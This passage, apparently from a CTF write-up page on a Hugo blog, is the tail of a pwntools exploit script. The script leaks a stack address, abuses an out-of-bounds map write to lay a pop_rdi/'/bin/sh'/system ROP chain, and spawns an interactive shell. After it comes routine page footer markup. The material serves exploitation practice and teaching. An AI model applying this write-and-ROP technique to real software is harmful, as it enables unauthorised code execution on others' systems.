+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(before_environ<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">0x4</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get_map(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Value: &#34;</span>)
+</span></span><span style="display:flex;"><span>stack <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntil(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>)[:<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>]<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span><span style="display:flex;"><span>rip <span style="color:#ff7b72;font-weight:bold">=</span> stack <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x130</span>
+</span></span><span style="display:flex;"><span>initial_rip_addr <span style="color:#ff7b72;font-weight:bold">=</span> (rip <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x4</span>) <span style="color:#ff7b72;font-weight:bold">-</span> (stack <span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span> <span style="color:#a5d6ff">32</span>)<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0xc</span>
+</span></span><span style="display:flex;"><span>print(hex(stack))
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>unrecv(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(initial_rip_addr))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">2</span>, (stack <span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span> <span style="color:#a5d6ff">32</span>), p64(<span style="color:#a5d6ff">0x100000000</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(rip<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x4</span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">0xc</span>))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">1</span>, p64(<span style="color:#a5d6ff">0x100000000</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(rip<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x8</span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x4</span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">0xc</span>))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">1</span>, p64(<span style="color:#a5d6ff">0x100000000</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(rip<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x10</span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x4</span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">0xc</span>))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">1</span>, p64(system))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(rip<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x8</span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x4</span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">0xc</span>))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">1</span>, p64(binsh))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(rip<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x4</span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">0xc</span>))
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">1</span>, p64(pop_rdi))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">45</span>, <span style="color:#a5d6ff">0x3db</span>, p64(initial_rip_addr)) 
+</span></span><span style="display:flex;"><span>set_map(<span style="color:#a5d6ff">2</span>, (stack <span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span> <span style="color:#a5d6ff">32</span>), p64(ret))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     bitfriends 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
